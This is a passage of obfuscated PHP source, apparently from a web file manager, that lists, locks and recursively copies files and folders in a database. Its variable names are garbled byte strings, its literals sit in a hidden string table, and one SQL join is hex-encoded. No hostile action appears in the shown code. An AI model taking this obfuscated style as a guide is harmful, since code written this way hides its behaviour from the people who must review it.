unset($úŸ°æ×«[$…ˆû£°÷[466]][$…ˆû£°÷[535]]); continue; } $‘ÏËÊúÚ = $úŸ°æ×«[$…ˆû£°÷[466]][$…ˆû£°÷[535]]; $úŸ°æ×«[$…ˆû£°÷[466]][$…ˆû£°÷[538]] = Model($…ˆû£°÷[525])->getInfoSimpleOuter($‘ÏËÊúÚ); } } unset($úŸ°æ×«); } public function parentLevelArray($¤Ãºİü) { $“¯”§Ê¼ =& $_SERVER[Îûáû“ş]; $¤Ãºİü = explode($“¯”§Ê¼[50], trim($¤Ãºİü, $“¯”§Ê¼[50])); return array_remove_value($¤Ãºİü, $“¯”§Ê¼[198]); } public function listAll($“°¦›î¿) { $¾®ãâ¢¶ =& $_SERVER[Îûáû“ş]; $”ëæÄİ… = $this->sourceInfo($“°¦›î¿); $©§ñˆ¨¯ = array($¾®ãâ¢¶[539] => array($¾®ãâ¢¶[540], $”ëæÄİ…[$¾®ãâ¢¶[511]] . $“°¦›î¿ . $¾®ãâ¢¶[541]), $¾®ãâ¢¶[542] => 0); $„¼·Ù´‘ = $¾®ãâ¢¶[543]; $Ù™Ì“Å£ = "\x4c\105\106\x54\x20\112\x4f\111\116\x20{$this->tablePrefix}\x69\157\137\x66\x69\154\x65\40\146\151\x6c\145\x20\x6f\156\x20\x73\157\x75\162\143\x65\56\x66\x69\154\145\x49\x44\40\x3d\x20\146\151\x6c\x65\x2e\146\x69\x6c\145\111\x44"; $… ¢á‹ = $this->alias($¾®ãâ¢¶[446])->field($„¼·Ù´‘)->where($©§ñˆ¨¯)->join($Ù™Ì“Å£)->select(); $this->_listAppendAuth($… ¢á‹); $this->_listAppendUser($… ¢á‹); $this->_listAppendPath($… ¢á‹); $… ¢á‹ = array_to_keyvalue($… ¢á‹, $¾®ãâ¢¶[402]); $°ı¦°É¤ = "\57{$”ëæÄİ…[$¾®ãâ¢¶[32]]}\x2f"; $°ı¦°É¤ = $°ı¦°É¤ == $¾®ãâ¢¶[519] ? $¾®ãâ¢¶[8] : $°ı¦°É¤; $·ò®Á—‘ = array(); foreach ($… ¢á‹ as $ï½§¿«Ğ => $ÎÛÅıŠ) { $ÀòÃ¹¿ƒ = $this->parentLevelArray($ÎÛÅıŠ[$¾®ãâ¢¶[511]]); array_shift($ÀòÃ¹¿ƒ); $á¤„Åğœ = $°ı¦°É¤; for ($†¤‡ö  = 0; $†¤‡ö  < count($ÀòÃ¹¿ƒ); $†¤‡ö ++) { $á¤„Åğœ .= $… ¢á‹[$ÀòÃ¹¿ƒ[$†¤‡ö ]][$¾®ãâ¢¶[32]] . $¾®ãâ¢¶[8]; } $á¤„Åğœ .= $ÎÛÅıŠ[$¾®ãâ¢¶[32]]; if ($ÎÛÅıŠ[$¾®ãâ¢¶[410]]) { $á¤„Åğœ .= $¾®ãâ¢¶[8]; } $ÀüıÙ™ = array($¾®ãâ¢¶[421] => str_replace($¾®ãâ¢¶[519], $¾®ãâ¢¶[8], str_replace($¾®ãâ¢¶[519], $¾®ãâ¢¶[8], str_replace($¾®ãâ¢¶[519], $¾®ãâ¢¶[8], $á¤„Åğœ))), $¾®ãâ¢¶[544] => intval($ÎÛÅıŠ[$¾®ãâ¢¶[410]]), $¾®ãâ¢¶[545] => intval($ÎÛÅıŠ[$¾®ãâ¢¶[76]]), $¾®ãâ¢¶[85] => intval($ÎÛÅıŠ[$¾®ãâ¢¶[85]]), $¾®ãâ¢¶[87] => $this->pathInfoFilter($ÎÛÅıŠ)); if (!$ÀüıÙ™[$¾®ãâ¢¶[410]]) { $ÀüıÙ™[$¾®ãâ¢¶[468]] = $ÎÛÅıŠ[$¾®ãâ¢¶[468]]; } $·ò®Á—‘[] = $ÀüıÙ™; } $·ò®Á—‘ = array_sort_by($·ò®Á—‘, $¾®ãâ¢¶[84]); return $·ò®Á—‘; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($÷õÒº”Ë) { $°ÚÊÜµÈ =& $_SERVER[Îûáû“ş]; if (!$this->allowLock()) { return; } $this->_lockCheck($°ÚÊÜµÈ[546], $÷õÒº”Ë); $ßÈÒ­Í = 1; $this->_lockEvent($÷õÒº”Ë, array($°ÚÊÜµÈ[547], $°ÚÊÜµÈ[548]), $ßÈÒ­Í); $this->_lockParent($÷õÒº”Ë, array($°ÚÊÜµÈ[548]), $ßÈÒ­Í); $this->_lockEvent($÷õÒº”Ë, array($°ÚÊÜµÈ[549], $°ÚÊÜµÈ[550]), $ßÈÒ­Í); $this->_lockCheckEnd($°ÚÊÜµÈ[546], $÷õÒº”Ë); } public function lockCopyEnd($„Ü±·ş) { $‰˜«‚¬¯ =& $_SERVER[Îûáû“ş]; if (!$this->allowLock()) { return; } $Àòò…¢· = 0; $this->_lockEvent($„Ü±·ş, array($‰˜«‚¬¯[547], $‰˜«‚¬¯[548]), $Àòò…¢·); $this->_lockParent($„Ü±·ş, array($‰˜«‚¬¯[548]), $Àòò…¢·); $this->_lockEvent($„Ü±·ş, array($‰˜«‚¬¯[549], $‰˜«‚¬¯[550]), $Àòò…¢·); } public function lockWriteStart($€Ñ´ğ’Ô, $Åàè¸üÖ = '') { $êá£ŠÄ =& $_SERVER[Îûáû“ş]; if (!$this->allowLock()) { return; } $this->_lockCheck($êá£ŠÄ[547], $€Ñ´ğ’Ô); $Äå×óÄÙ = 1; $this->_lockKey($êá£ŠÄ[551] . $€Ñ´ğ’Ô . $êá£ŠÄ[10] . $Åàè¸üÖ, $Äå×óÄÙ); $this->_lockEvent($€Ñ´ğ’Ô, array($êá£ŠÄ[546], $êá£ŠÄ[548]), $Äå×óÄÙ); $this->_lockParent($€Ñ´ğ’Ô, array($êá£ŠÄ[546], $êá£ŠÄ[548]), $Äå×óÄÙ); $this->_lockCheckEnd($êá£ŠÄ[547], $€Ñ´ğ’Ô); } public function lockWriteEnd($êí¹íÛ, $¦ü¿º¼â = '') { $ıãö¸› =& $_SERVER[Îûáû“ş]; if (!$this->allowLock()) { return; } $ÜŒ˜Ğ™ = 0; $this->_lockKey($ıãö¸›[551] . $êí¹íÛ . $ıãö¸›[10] . $¦ü¿º¼â, $ÜŒ˜Ğ™); $this->_lockEvent($êí¹íÛ, array($ıãö¸›[546], $ıãö¸›[548]), $ÜŒ˜Ğ™); $this->_lockParent($êí¹íÛ, array($ıãö¸›[546], $ıãö¸›[548]), $ÜŒ˜Ğ™); } public function lockMoveStart($í•¥—ğÊ) { $¡¥Î•‹÷ =& $_SERVER[Îûáû“ş]; if (!$this->allowLock()) { return; } $this->_lockCheck($¡¥Î•‹÷[548], $í•¥—ğÊ); $…¯Ú“ğ® = 1; $this->_lockKey($¡¥Î•‹÷[552] . $í•¥—ğÊ, $…¯Ú“ğ®); $this->_lockEvent($í•¥—ğÊ, array($¡¥Î•‹÷[546], $¡¥Î•‹÷[547]), $…¯Ú“ğ®); $this->_lockParent($í•¥—ğÊ, array($¡¥Î•‹÷[546], $¡¥Î•‹÷[548]), $…¯Ú“ğ®); $this->_lockEvent($í•¥—ğÊ, array($¡¥Î•‹÷[553], $¡¥Î•‹÷[549], $¡¥Î•‹÷[550]), $…¯Ú“ğ®); $this->_lockCheckEnd($¡¥Î•‹÷[548], $í•¥—ğÊ); } public function lockMoveEnd($ıÕùÁ­Õ) { $Í±›ÁèÑ =& $_SERVER[Îûáû“ş]; if (!$this->allowLock()) { return; } $éÀİçéÖ = 0; $this->_lockKey($Í±›ÁèÑ[552] . $ıÕùÁ­Õ, $éÀİçéÖ); $this->_lockEvent($ıÕùÁ­Õ, array($Í±›ÁèÑ[546], $Í±›ÁèÑ[547]), $éÀİçéÖ); $this->_lockParent($ıÕùÁ­Õ, array($Í±›ÁèÑ[546], $Í±›ÁèÑ[548]), $éÀİçéÖ); $this->_lockEvent($ıÕùÁ­Õ, array($Í±›ÁèÑ[553], $Í±›ÁèÑ[549], $Í±›ÁèÑ[550]), $éÀİçéÖ); } private function _lockCheck($ÃÂİ¨”, $–†¦¤³) { $Ó¬ÆÛ™ =& $_SERVER[Îûáû“ş]; $ÃÁ¿²² = $this->sourceInfo($–†¦¤³); $¡ıÕ ¡¥ = $ÃÂİ¨” . $Ó¬ÆÛ™[10] . $–†¦¤³; $this->_lockTimeStart[$¡ıÕ ¡¥] = timeFloat(); if (!is_array($ÃÁ¿²²)) { return; } $æıó°ôè = LNG($Ó¬ÆÛ™[554]); CacheLock::setErrorMsg($Ó¬ÆÛ™[162] . htmlspecialchars($ÃÁ¿²²[$Ó¬ÆÛ™[32]]) . $Ó¬ÆÛ™[164] . $æıó°ôè); $this->_lockKey($¡ıÕ ¡¥, 1); $this->_lockKey($¡ıÕ ¡¥, 0); $ºÒ‘¾•¤ = array_reverse($this->parentLevelArray($ÃÁ¿²²[$Ó¬ÆÛ™[511]])); foreach ($ºÒ‘¾•¤ as $îÎÔâª–) { $¡ıÕ ¡¥ = $ÃÂİ¨” . $Ó¬ÆÛ™[555] . $îÎÔâª–; if (CacheLock::lockGet($Ó¬ÆÛ™[556] . $¡ıÕ ¡¥)) { $ÃÁ¿²² = $this->sourceInfo($îÎÔâª–); CacheLock::setErrorMsg($Ó¬ÆÛ™[162] . htmlspecialchars($ÃÁ¿²²[$Ó¬ÆÛ™[32]]) . $Ó¬ÆÛ™[164] . $æıó°ôè); $this->_lockKey($¡ıÕ ¡¥, 1); $this->_lockKey($¡ıÕ ¡¥, 0); } } } private function _lockCheckEnd($Íé¥Å†Ó, $¥ÊıÓƒÅ) { $˜æ³àã =& $_SERVER[Îûáû“ş]; $Ã¹ÖôÑŸ = $Íé¥Å†Ó . $˜æ³àã[10] . $¥ÊıÓƒÅ; CacheLock::setErrorMsg($˜æ³àã[378]); if (!isset($this->_lockTimeStart[$Ã¹ÖôÑŸ])) { return; } $´©£Ôš¹ = timeFloat() - $this->_lockTimeStart[$Ã¹ÖôÑŸ]; unset($this->_lockTimeStart[$Ã¹ÖôÑŸ]); if ($´©£Ôš¹ > 0.5) { unset(self::$cacheSourceInfo[$˜æ³àã[460] . $¥ÊıÓƒÅ]); } $Êö´Ûå = $this->sourceInfo($¥ÊıÓƒÅ); if (!$Êö´Ûå) { show_json(LNG($˜æ³àã[105]), !1); } } private function _lockParent($¾ºë½Úè, $¼Ëş­Û˜, $Œí¼¡³–) { if (!$this->autoLockSet) { return; } $»³ŠØ‘¢ = $this->sourceInfo($¾ºë½Úè); if (!is_array($»³ŠØ‘¢)) { return; } $½¨„“ã = array_reverse($this->parentLevelArray($»³ŠØ‘¢[$_SERVER[Îûáû“ş][511]])); foreach ($½¨„“ã as $òËè¢¶ğ) { $this->_lockEvent($òËè¢¶ğ, $¼Ëş­Û˜, $Œí¼¡³–); } } private function _lockEvent($Ø§‰©óê, $¬üˆ’Ä¦, $ßšº¸š) { $ùõíÜÇ =& $_SERVER[Îûáû“ş]; if (!$this->autoLockSet) { return; } foreach ($¬üˆ’Ä¦ as $Â²‚üÄ) { $‡‰…Ä€ï = $Â²‚üÄ . $ùõíÜÇ[10] . $Ø§‰©óê; if ($ßšº¸š && CacheLock::lockGet($ùõíÜÇ[556] . $‡‰…Ä€ï)) { continue; } $this->_lockKey($‡‰…Ä€ï, $ßšº¸š); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($İÌ’‘Ü², $Íí¼ƒéŸ = 1) { $šÙğŸ× = $_SERVER[Îûáû“ş][556] . md5($İÌ’‘Ü²); if ($Íí¼ƒéŸ) { if (isset(self::$_lockItemArr[$šÙğŸ×])) { return; } self::$_lockItemArr[$šÙğŸ×] = 1; CacheLock::lock($šÙğŸ×, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$šÙğŸ×])) { return; } unset(self::$_lockItemArr[$šÙğŸ×]); CacheLock::unlock($šÙğŸ×); } } public function isParentOf($’ßı„», $ÃÊ‰’‹¢) { $Ç¨ùµÕ =& $_SERVER[Îûáû“ş]; $¤ñÌÑâÊ = $this->sourceInfo($’ßı„»); $†ûÇÀâ‹ = $this->sourceInfo($ÃÊ‰’‹¢); $ÅÑöõŠÙ = $¤ñÌÑâÊ[$Ç¨ùµÕ[511]] . $¤ñÌÑâÊ[$Ç¨ùµÕ[402]] . $Ç¨ùµÕ[50]; $ç¡áˆ³› = $†ûÇÀâ‹[$Ç¨ùµÕ[511]] . $†ûÇÀâ‹[$Ç¨ùµÕ[402]] . $Ç¨ùµÕ[50]; $Œ‹ğÄóö = strpos($ç¡áˆ³›, $ÅÑöõŠÙ) === 0; return $Œ‹ğÄóö; } private $targetIsDelete = 0; public function copy($ƒÏĞÕÆ, $ÒÜ–Øı¢, $Å€ˆ‹Ä• = REPEAT_REPLACE, $…ô¦ £ê = '') { $«ì¿Í˜¬ =& $_SERVER[Îûáû“ş]; $ĞŞÏü’ş = $this->sourceInfo($ƒÏĞÕÆ); $„‘³è´ß = $this->sourceInfo($ÒÜ–Øı¢); if (!$ĞŞÏü’ş || !$„‘³è´ß || $„‘³è´ß[$«ì¿Í˜¬[410]] != $«ì¿Í˜¬[88]) { return !1; } if ($this->isParentOf($ƒÏĞÕÆ, $ÒÜ–Øı¢)) { return !1; } $è¡±÷¢ñ = $…ô¦ £ê ? $…ô¦ £ê : $ĞŞÏü’ş[$«ì¿Í˜¬[32]]; $this->lockCopyStart($ƒÏĞÕÆ); $this->lockWriteStart($ÒÜ–Øı¢, $è¡±÷¢ñ); $‹ÁçĞö = array($«ì¿Í˜¬[557] => array(), $«ì¿Í˜¬[558] => array(), $«ì¿Í˜¬[559] => array()); $this->targetIsDelete = intval($ĞŞÏü’ş[$«ì¿Í˜¬[431]]); $İš¨î—ó = $this->fileNameExistCache($ÒÜ–Øı¢, $ĞŞÏü’ş[$«ì¿Í˜¬[32]]); $á—ÅŸ  = $this->_copy($ƒÏĞÕÆ, $ÒÜ–Øı¢, $Å€ˆ‹Ä•, $‹ÁçĞö, !0, $…ô¦ £ê); $this->_childrenListClear(); $this->lockCopyEnd($ƒÏĞÕÆ); $this->lockWriteEnd($ÒÜ–Øı¢, $è¡±÷¢ñ); if ($ĞŞÏü’ş[$«ì¿Í˜¬[410]] == $«ì¿Í˜¬[88] && $İš¨î—ó == $á—ÅŸ ) { $this->folderSizeResetChildren($İš¨î—ó); } Model($«ì¿Í˜¬[560])->addAll($‹ÁçĞö[$«ì¿Í˜¬[558]], array(), !0); if ($İš¨î—ó != $á—ÅŸ  || $ĞŞÏü’ş[$«ì¿Í˜¬[410]] == $«ì¿Í˜¬[88]) { Model($«ì¿Í˜¬[561])->eventCopy($á—ÅŸ ); } $this->saveAll($‹ÁçĞö[$«ì¿Í˜¬[559]]); Model($«ì¿Í˜¬[200])->linkAdd($‹ÁçĞö[$«ì¿Í˜¬[557]]); $this->folderSizeReset($ÒÜ–Øı¢); $this->updateModifyTime($ÒÜ–Øı¢); return $á—ÅŸ ; } private function _copy($“èËŸö¸, $’¶öúÚâ, $Ù¨ÜÆÙ, &$ı ı«ÑÁ, $«„ˆš, $ï½ë½Ü† = '') { $ØûüÇÔ½ =& $_SERVER[Îûáû“ş]; $ª»ÎÏÚº = $this->sourceInfoCache($“èËŸö¸); $•ø£š¶ = $ª»ÎÏÚº[$ØûüÇÔ½[410]] == $ØûüÇÔ½[88]; $”ÛæÄëæ = $ï½ë½Ü† ? $ï½ë½Ü† : $ª»ÎÏÚº[$ØûüÇÔ½[32]]; $ª¼ÙÑŸˆ = $this->fileNameExistCache($’¶öúÚâ, $”ÛæÄëæ); if ($«„ˆš) { $this->_childrenAllMake($“èËŸö¸); if ($•ø£š¶ && $ª¼ÙÑŸˆ) { $this->_childrenAllMake($ª¼ÙÑŸˆ); } } if (!$ª¼ÙÑŸˆ) { return $this->_copyCreate($“èËŸö¸, $’¶öúÚâ, $”ÛæÄëæ, $ı ı«ÑÁ); } $÷ĞÔÂĞ = $ª¼ÙÑŸˆ; if ($•ø£š¶) { if ($Ù¨ÜÆÙ == REPEAT_RENAME_FOLDER) { $”ÛæÄëæ = $this->fileNameAutoCache($’¶öúÚâ, $”ÛæÄëæ, $Ù¨ÜÆÙ, $•ø£š¶); $÷ĞÔÂĞ = $this->_copyCreate($“èËŸö¸, $’¶öúÚâ, $”ÛæÄëæ, $ı ı«ÑÁ); } else { $„Î¸İ = $this->_childrenList($“èËŸö¸); foreach ($„Î¸İ as $èñ©’Ù¹) { $this->_copy($èñ©’Ù¹[$ØûüÇÔ½[402]], $ª¼ÙÑŸˆ, $Ù¨ÜÆÙ, $ı ı«ÑÁ, !1); } } } else { if ($Ù¨ÜÆÙ == REPEAT_RENAME || $Ù¨ÜÆÙ == REPEAT_RENAME_FOLDER) { $”ÛæÄëæ = $this->fileNameAutoCache($’¶öúÚâ, $”ÛæÄëæ, $Ù¨ÜÆÙ, $•ø£š¶); $÷ĞÔÂĞ = $this->_copyCreate($“èËŸö¸, $’¶öúÚâ, $”ÛæÄëæ, $ı ı«ÑÁ); } else { if ($Ù¨ÜÆÙ == REPEAT_REPLACE) { $ìÈù§© = $this->sourceInfoCache($ª¼ÙÑŸˆ); $¥Ñœùøİ = $this->fileHistory($ìÈù§©, $ª»ÎÏÚº[$ØûüÇÔ½[468]], $ª»ÎÏÚº[$ØûüÇÔ½[76]]); if ($¥Ñœùøİ) { $ı ı«ÑÁ[$ØûüÇÔ½[557]][] = $ª»ÎÏÚº[$ØûüÇÔ½[468]]; } } else { if ($Ù¨ÜÆÙ == REPEAT_SKIP) { } } } Hook::trigger($ØûüÇÔ½[562], array($ØûüÇÔ½[563], $ª»ÎÏÚº, 0)); } return $÷ĞÔÂĞ; } private function _copyCreate($›ıµ…¼ü, $®Ê¸×¿Å, $¶¢ÅĞ„, &$ÎÆË¤‘ñ) { $ú¾í÷°õ =& $_SERVER[Îûáû“ş]; $Ø¸Õ´âÔ = $this->sourceInfoCache($›ıµ…¼ü); $â—¤úº¯ = $this->sourceInfoCache($®Ê¸×¿Å); $³Ê£Ë¡¼ = $this->_makeItemData($Ø¸Õ´âÔ, $â—¤úº¯, $¶¢ÅĞ„); Hook::trigger($ú¾í÷°õ[564], $³Ê£Ë¡¼); Hook::trigger($ú¾í÷°õ[565], array($ú¾í÷°õ[566], $³Ê£Ë¡¼, 0)); $’×›©Å¤ = $this->add($³Ê£Ë¡¼); $—ş¾Ãæê = array($ú¾í÷°õ[402] => $’×›©Å¤, $ú¾í÷°õ[32] => $¶¢ÅĞ„); $this->_copyApplyMeta($—ş¾Ãæê, $ÎÆË¤‘ñ); if ($Ø¸Õ´âÔ[$ú¾í÷°õ[410]] != $ú¾í÷°õ[88]) { $ÎÆË¤‘ñ[$ú¾í÷°õ[557]][] = $Ø¸Õ´âÔ[$ú¾í÷°õ[468]]; return $’×›©Å¤; } $æöô€µº = array(); $™­†Ğê = array(); $this->_childrenListAll($›ıµ…¼ü, $æöô€µº); $ÛÕõ­èÕ = count($æöô€µº); if ($ÛÕõ­èÕ == 0) { return $’×›©Å¤; } $ËòÔ‚ˆƒ = $this->sourceInfo($’×›©Å¤); foreach ($æöô€µº as $öğ¢‹„Ê) { $¹Í«÷®Â = $this->_makeItemData($öğ¢‹„Ê, $ËòÔ‚ˆƒ, $öğ¢‹„Ê[$ú¾í÷°õ[32]]); $¹Í«÷®Â[$ú¾í÷°õ[511]] = $öğ¢‹„Ê[$ú¾í÷°õ[511]]; $™­†Ğê[] = $¹Í«÷®Â; } $this->chunkEventSet($ú¾í÷°õ[567], array($ú¾í÷°õ[568], $³Ê£Ë¡¼, $ÛÕõ­èÕ)); $this->addAll($™­†Ğê, array(), !1); $‰ìõıÒß = $this->where(array($ú¾í÷°õ[432] => $’×›©Å¤))->select(); $ÙØ†ƒí = $this->_childrenMakeRelation($æöô€µº, $‰ìõıÒß); $ÙØ†ƒí[$›ıµ…¼ü] = $’×›©Å¤; $ä”Šüä® = array(); $¢”›œÅ¬ = array(); foreach ($‰ìõıÒß as $öğ¢‹„Ê) { $ûÌ¥Áöó = $öğ¢‹„Ê[$ú¾í÷°õ[402]]; $Ã€êÀó = $this->_childrenMatch($ÙØ†ƒí, $öğ¢‹„Ê, $ËòÔ‚ˆƒ); $ä”Šüä®[] = array($ú¾í÷°õ[402], $ûÌ¥Áöó, $ú¾í÷°õ[432], $Ã€êÀó[$ú¾í÷°õ[432]]); $¢”›œÅ¬[] = array($ú¾í÷°õ[402], $ûÌ¥Áöó, $ú¾í÷°õ[511], $Ã€êÀó[$ú¾í÷°õ[511]]); $this->_copyApplyMeta($öğ¢‹„Ê, $ÎÆË¤‘ñ); if ($öğ¢‹„Ê[$ú¾í÷°õ[410]] != $ú¾í÷°õ[88]) { $ÎÆË¤‘ñ[$ú¾í÷°õ[557]][] = $öğ¢‹„Ê[$ú¾í÷°õ[468]]; } } $this->chunkEventSet($ú¾í÷°õ[569], array($ú¾í÷°õ[570], $³Ê£Ë¡¼, $ÛÕõ­èÕ)); $this->saveAll($ä”Šüä®); $this->chunkEventSet($ú¾í÷°õ[571], array($ú¾í÷°õ[572], $³Ê£Ë¡¼, $ÛÕõ­èÕ)); $this->saveAll($¢”›œÅ¬); return $’×›©Å¤; } private function _childrenMakeRelation($­®ÎäˆÕ, $„º¼øœñ) { $¢ş‹»–ã =& $_SERVER[Îûáû“ş]; $‹ÖÙš½Ÿ = array(); $í‹ƒ²¶ì = array(); foreach ($­®ÎäˆÕ as $Ù¢ûä‚ò) { $é§ÈŒ¬ = $Ù¢ûä‚ò[$¢ş‹»–ã[32]] . $¢ş‹»–ã[8] . $Ù¢ûä‚ò[$¢ş‹»–ã[511]]; $‹ÖÙš½Ÿ[$é§ÈŒ¬] = $Ù¢ûä‚ò[$¢ş‹»–ã[402]]; } foreach ($„º¼øœñ as $Ù¢ûä‚ò) { $é§ÈŒ¬ = $Ù¢ûä‚ò[$¢ş‹»–ã[32]] . $¢ş‹»–ã[8] . $Ù¢ûä‚ò[$¢ş‹»–ã[511]]; $ƒÈãÂ†‹ = $‹ÖÙš½Ÿ[$é§ÈŒ¬]; $í‹ƒ²¶ì[$ƒÈãÂ†‹] = $Ù¢ûä‚ò[$¢ş‹»–ã[402]]; } return $í‹ƒ²¶ì; } private function _childrenMatch($€å¶ÊŠÇ, $ˆîë»‚Ò, $ôõû•ƒ°) { $÷§“¨ô± =& $_SERVER[Îûáû“ş]; $‹ä™ŒÉØ = $ôõû•ƒ°[$÷§“¨ô±[511]]; $—Ê—£ô = $this->parentLevelArray($ˆîë»‚Ò[$÷§“¨ô±[511]]); foreach ($—Ê—£ô as $úÊ±³™ì) { if (isset($€å¶ÊŠÇ[$úÊ±³™ì])) { $‹ä™ŒÉØ .= $€å¶ÊŠÇ[$úÊ±³™ì] . $÷§“¨ô±[573]; } } $‹ä™ŒÉØ = rtrim($‹ä™ŒÉØ, $÷§“¨ô±[50]) . $÷§“¨ô±[50]; $­„Ñ£Ğ = $this->parentLevelArray($‹ä™ŒÉØ); $‰üÔÅ¢• = $­„Ñ£Ğ[count($­„Ñ£Ğ) - 1]; return array($÷§“¨ô±[432] => $‰üÔÅ¢•, $÷§“¨ô±[511] => $‹ä™ŒÉØ); } private function _makeItemData($ü°•ƒî¿, $¢ößï®È, $½ªú‘Ã¨) { $¿º¥ø» =& $_SERVER[Îûáû“ş]; $êŠßÜ³ë = array($¿º¥ø»[574] => $ü°•ƒî¿[$¿º¥ø»[410]], $¿º¥ø»[420] => $½ªú‘Ã¨, $¿º¥ø»[575] => $ü°•ƒî¿[$¿º¥ø»[412]] ? $ü°•ƒî¿[$¿º¥ø»[412]] : $¿º¥ø»[12], $¿º¥ø»[469] => $ü°•ƒî¿[$¿º¥ø»[468]] ? $ü°•ƒî¿[$¿º¥ø»[468]] : 0, $¿º¥ø»[545] => $ü°•ƒî¿[$¿º¥ø»[76]] ? $ü°•ƒî¿[$¿º¥ø»[76]] : 0, $¿º¥ø»[576] => intval($¢ößï®È[$¿º¥ø»[411]]), $¿º¥ø»[577] => intval($¢ößï®È[$¿º¥ø»[496]]), $¿º¥ø»[578] => intval(USER_ID), $¿º¥ø»[579] => intval(USER_ID), $¿º¥ø»[401] => intval($¢ößï®È[$¿º¥ø»[402]]), $¿º¥ø»[580] => $¢ößï®È[$¿º¥ø»[511]] . $¢ößï®È[$¿º¥ø»[402]] . $¿º¥ø»[50], $¿º¥ø»[424] => $ü°•ƒî¿[$¿º¥ø»[85]] ? $ü°•ƒî¿[$¿º¥ø»[85]] : time(), $¿º¥ø»[430] => 0, $¿º¥ø»[581] => $¿º¥ø»[12]); return $êŠßÜ³ë; } private function _copyApplyMeta($ºÃ’§ŞË, &$şËºœéò) { $¿ÖÖ­œ¨ =& $_SERVER[Îûáû“ş]; $ÛåÑÏß¹ = $ºÃ’§ŞË[$¿ÖÖ­œ¨[402]]; $£Ş°ßÌ÷ = $ºÃ’§ŞË[$¿ÖÖ­œ¨[32]]; if (!isset($ºÃ’§ŞË[$¿ÖÖ­œ¨[582]]) || !$ºÃ’§ŞË[$¿ÖÖ­œ¨[582]] || $ºÃ’§ŞË[$¿ÖÖ­œ¨[582]] == $¿ÖÖ­œ¨[198]) { $şËºœéò[$¿ÖÖ­œ¨[559]][] = array($¿ÖÖ­œ¨[402], $ÛåÑÏß¹, $¿ÖÖ­œ¨[582], short_id($ÛåÑÏß¹)); } if (Input::check($£Ş°ßÌ÷, $¿ÖÖ­œ¨[583])) { $şËºœéò[$¿ÖÖ­œ¨[558]][] = array($¿ÖÖ­œ¨[402] => $ÛåÑÏß¹, $¿ÖÖ­œ¨[94] => $¿ÖÖ­œ¨[465], $¿ÖÖ­œ¨[374] => str_replace($¿ÖÖ­œ¨[53], $¿ÖÖ­œ¨[12], Pinyin::get($£Ş°ßÌ÷))); $şËºœéò[$¿ÖÖ­œ¨[558]][] = array($¿ÖÖ­œ¨[402] => $ÛåÑÏß¹, $¿ÖÖ­œ¨[94] => $¿ÖÖ­œ¨[464], $¿ÖÖ­œ¨[374] => Pinyin::get($£Ş°ßÌ÷, $¿ÖÖ­œ¨[584])); } $şËºœéò[$¿ÖÖ­œ¨[558]][] = array($¿ÖÖ­œ¨[402] => $ÛåÑÏß¹, $¿ÖÖ­œ¨[94] => $¿ÖÖ­œ¨[444], $¿ÖÖ­œ¨[374] => KodSort::makeStr($£Ş°ßÌ÷)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($€»°·¦ç) { $§’˜éÆ =& $_SERVER[Îûáû“ş]; $Â®¹‚Ù„ = $this->sourceInfo($€»°·¦ç); $°†ƒ·ì‚ = $§’˜éÆ[585]; $¦ƒºË¤‰ = array($§’˜éÆ[511] => array($§’˜éÆ[540], $Â®¹‚Ù„[$§’˜éÆ[511]] . $€»°·¦ç . $§’˜éÆ[541]), $§’˜éÆ[431] => $this->targetIsDelete); $§÷‘ù¦Ÿ = $this->field($°†ƒ·ì‚)->where($¦ƒºË¤‰)->select(); if (!$§÷‘ù¦Ÿ) { return; } $§÷‘ù¦Ÿ = array_to_keyvalue($§÷‘ù¦Ÿ, $§’˜éÆ[402]); foreach ($§÷‘ù¦Ÿ as $Û¸”ˆíÕ) { $æÑÖç  = $Û¸”ˆíÕ[$§’˜éÆ[432]]; $€»°·¦ç = $Û¸”ˆíÕ[$§’˜éÆ[402]]; if (!isset($this->_childrenListCache[$€»°·¦ç]) && $Û¸”ˆíÕ[$§’˜éÆ[410]] == $§’˜éÆ[88]) { $this->_childrenListCache[$€»°·¦ç] = array(); } if (!isset($this->_childrenListCache[$æÑÖç ])) { $this->_childrenListCache[$æÑÖç ] = array(); } $this->_childrenListCache[$æÑÖç ][$€»°·¦ç] = $Û¸”ˆíÕ; $this->_childrenItemCache[$€»°·¦ç] = $Û¸”ˆíÕ; } } private function _childrenListAll($¾†ºééí, &$çò´²) { $Ù”òì× =& $_SERVER[Îûáû“ş]; if (!isset($this->_childrenListCache[$¾†ºééí])) { return; } $øª™ªˆî = $this->_childrenListCache[$¾†ºééí]; foreach ($øª™ªˆî as $½ÜîÛÎ => $ºŞÎƒÖİ) { $çò´²[$½ÜîÛÎ] = $ºŞÎƒÖİ; if ($ºŞÎƒÖİ[$Ù”òì×[410]] == $Ù”òì×[88]) { $this->_childrenListAll($½ÜîÛÎ, $çò´²); } } } private function sourceInfoCache($—õÄò¿é) { if (isset($this->_childrenItemCache[$—õÄò¿é])) { return $this->_childrenItemCache[$—õÄò¿é]; } return $this->sourceInfo($—õÄò¿é); } private function _childrenList($çµøµ›Ã) { if (isset($this->_childrenListCache[$çµøµ›Ã])) { return $this->_childrenListCache[$çµøµ›Ã]; } return $this->_childrenListSelect($çµøµ›Ã); } private function _childrenListSelect($ô£À˜¸œ) { $¾ù¿å·İ =& $_SERVER[Îûáû“ş]; $è¯äßÒÌ = array($¾ù¿å·İ[432] => $ô£À˜¸œ, $¾ù¿å·İ[431] => $this->targetIsDelete); $”÷ÜÏß… = $this->where($è¯äßÒÌ)->select(); $”÷ÜÏß… = $”÷ÜÏß… ? $”÷ÜÏß… : array(); $ÎúƒÏ = array_to_keyvalue($”÷ÜÏß…, $¾ù¿å·İ[402]); $this->_childrenListCache[$ô£À˜¸œ] = $ÎúƒÏ; foreach ($ÎúƒÏ as $ô£À˜¸œ => $­»·Êüµ) { $this->_childrenItemCache[$ô£À˜¸œ] = $­»·Êüµ; } return $ÎúƒÏ; } private function fileNameExistCache($õçÜÒ¶, $Íë°Ì¡Ò) { $“ó’µ½… =& $_SERVER[Îûáû“ş]; $Íë°Ì¡Ò = strtolower($Íë°Ì¡Ò); $åœ¨÷Á° = $this->_childrenList($õçÜÒ¶); foreach ($åœ¨÷Á° as $‚‘ÕÑÉ£) { if ($Íë°Ì¡Ò == 